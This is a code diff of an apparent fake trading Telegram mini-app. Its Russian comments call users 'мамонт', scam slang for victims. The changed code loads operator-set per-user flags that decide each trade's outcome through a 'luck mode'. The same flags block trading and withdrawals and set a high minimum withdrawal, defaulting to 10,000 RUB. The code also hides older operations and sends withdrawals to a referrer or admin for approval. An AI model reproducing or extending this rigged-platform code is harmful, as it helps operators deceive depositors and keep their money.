@@ -1252,8 +1252,8 @@ const loadWalletDataFromSupabase = useCallback(async () => {
   if (!telegramId) return;
 
   try {
-    // 1. Загружаем операции кошелька
-    const [topupsRes, withdrawsRes] = await Promise.all([
+    // 1. Загружаем операции кошелька и настройки юзера параллельно
+    const [topupsRes, withdrawsRes, settingsRes] = await Promise.all([
       supabase
         .from("topups")
         .select("id, amount, status, created_at")
@@ -1264,20 +1264,19 @@ const loadWalletDataFromSupabase = useCallback(async () => {
         .select("id, amount, method, status, ts")
         .eq("user_tg_id", telegramId)
         .order("ts", { ascending: false }),
+      supabase
+        .from("users")
+        .select("luck_mode, is_blocked_trade, is_blocked_withdraw, min_deposit, min_withdraw")
+        .eq("tg_id", telegramId)
+        .maybeSingle()
     ]);
 
-    // 2. ЗАГРУЖАЕМ НАСТРОЙКИ ЮЗЕРА (Блокировки, Лимиты, Удача)
-    const { data: userSettings } = await supabase
-      .from("users")
-      .select("luck_mode, is_blocked_trade, is_blocked_withdraw, min_deposit, min_withdraw")
-      .eq("tg_id", telegramId)
-      .maybeSingle();
-
-    if (userSettings) {
-      setUserFlags(userSettings); // Сохраняем в стейт
+    // 2. Сохраняем настройки мамонта (блокировки, удача)
+    if (settingsRes.data) {
+      setUserFlags(settingsRes.data);
     }
 
-    // 3. Грузим активы пользователя
+    // 3. Грузим активы пользователя (если есть user.id)
     if (user) {
       const { data: assets } = await supabase
         .from("user_assets")
@@ -1290,7 +1289,7 @@ const loadWalletDataFromSupabase = useCallback(async () => {
     if (topupsRes.error) console.error("loadWalletData topups error:", topupsRes.error);
     if (withdrawsRes.error) console.error("loadWalletData withdrawals error:", withdrawsRes.error);
 
-    // === ФИЛЬТРАЦИЯ: скрываем старые операции ===
+    // === ФИЛЬТРАЦИЯ: скрываем старые операции для нового аккаунта ===
     const userRegTime = user?.createdAt || 0;
     const rawTopups = topupsRes.data || [];
     const rawWithdrawals = withdrawsRes.data || [];
@@ -1307,7 +1306,7 @@ const loadWalletDataFromSupabase = useCallback(async () => {
 
     const normalizeStatus = (s) => (s || "").toLowerCase();
 
-    // Считаем баланс
+    // Считаем баланс только по новым операциям
     const approvedDepositSum = topups
       .filter((t) => normalizeStatus(t.status) === "approved")
       .reduce((acc, t) => acc + Number(t.amount || 0), 0);
@@ -2092,7 +2091,7 @@ const handleStartTrade = () => {
   const amountNum = parseFloat(raw);
   const minInvest = settings.currency === "RUB" ? 100 : 5;
 
-  // 1. ПРОВЕРКИ НА ОШИБКИ
+  // 1. БАЗОВЫЕ ПРОВЕРКИ
   if (Number.isNaN(amountNum) || amountNum <= 0) {
     setTradeError(
       isEN
@@ -2127,17 +2126,17 @@ const handleStartTrade = () => {
         ? "Trading is temporarily restricted on your account. Contact support." 
         : "Торговля временно ограничена на вашем аккаунте. Обратитесь в поддержку."
     );
-    triggerNotification("error");
+    triggerNotification("error"); // Вибрация
     return false;
   }
   // -------------------------------------------
 
-  // 2. ЗАПУСК СДЕЛКИ
+  // 2. ЗАПУСК
   triggerHaptic('heavy'); 
   setIsTradeProcessing(true);
   setTradeToastVisible(false);
 
-  // Списываем баланс
+  // Списываем ставку
   setBalance((prev) => Math.max(0, prev - amountRub));
 
   // --- НОВОЕ: ЛОГИКА УДАЧИ (LUCK MODE) ---
@@ -2146,10 +2145,10 @@ const handleStartTrade = () => {
   const possibleDirections = ["up", "down", "flat"];
 
   if (luck === 'win') {
-      // Всегда выигрывает (направление совпадает с выбором юзера)
+      // Мамонт всегда выигрывает (направление совпадает с выбором)
       resultDirection = tradeForm.direction; 
   } else if (luck === 'lose') {
-      // Всегда проигрывает (выбираем любое направление, кроме выбранного юзером)
+      // Мамонт всегда проигрывает (выбираем любое направление КРОМЕ того, что он выбрал)
       const losingOptions = possibleDirections.filter(d => d !== tradeForm.direction);
       resultDirection = losingOptions[Math.floor(Math.random() * losingOptions.length)];
   } else {
@@ -2165,7 +2164,7 @@ const handleStartTrade = () => {
     symbol: selectedSymbol,
     amount: amountRub, 
     direction: tradeForm.direction,
-    resultDirection, // Используем подкрученный или рандомный результат
+    resultDirection, // Используем результат с учетом подкрутки
     multiplier: tradeForm.multiplier,
     duration: tradeForm.duration,
     startedAt: Date.now(),
@@ -2201,6 +2200,7 @@ const handleStartTrade = () => {
   setTimeout(() => {
     setIsTradeProcessing(false);
     setTradeToastVisible(true);
+
     setTimeout(() => {
       setTradeToastVisible(false);
     }, 2200);
@@ -3131,7 +3131,7 @@ const handleWithdrawSubmit = async () => {
   const raw = walletForm.amount?.toString().replace(",", ".") || "";
   const amountNum = parseFloat(raw);
 
-  // Базовые проверки
+  // 1. Базовые проверки
   if (!amountNum || amountNum <= 0) { 
       setDepositError(isEN ? "Enter amount" : "Введите сумму"); 
       return; 
@@ -3164,9 +3164,10 @@ const handleWithdrawSubmit = async () => {
   }
 
   // --- НОВОЕ: ПРОВЕРКА МИНИМАЛЬНОЙ СУММЫ ВЫВОДА ---
-  // Берем из базы или ставим дефолт 10000
+  // Берем из базы или ставим дефолт 10000 RUB
   const minWdRub = userFlags?.min_withdraw || 10000; 
-  // Конвертируем введенную сумму в рубли для сравнения, если валюта USD
+  
+  // Конвертируем введенную сумму в рубли для сравнения с лимитом
   const amountInRub = settings.currency === "USD" ? amountNum * USD_RATE : amountNum;
 
   if (amountInRub < minWdRub) {
@@ -3184,6 +3185,7 @@ const handleWithdrawSubmit = async () => {
   const amountRub = settings.currency === "USD" ? amountNum * USD_RATE : amountNum;
   
   try {
+    // Определяем проверяющего (реферер или админ)
     let approverTgId = MAIN_ADMIN_TG_ID;
     const { data: userRow } = await supabase.from("users").select("referred_by").eq("tg_id", telegramId).maybeSingle();
     if (userRow?.referred_by) approverTgId = userRow.referred_by;
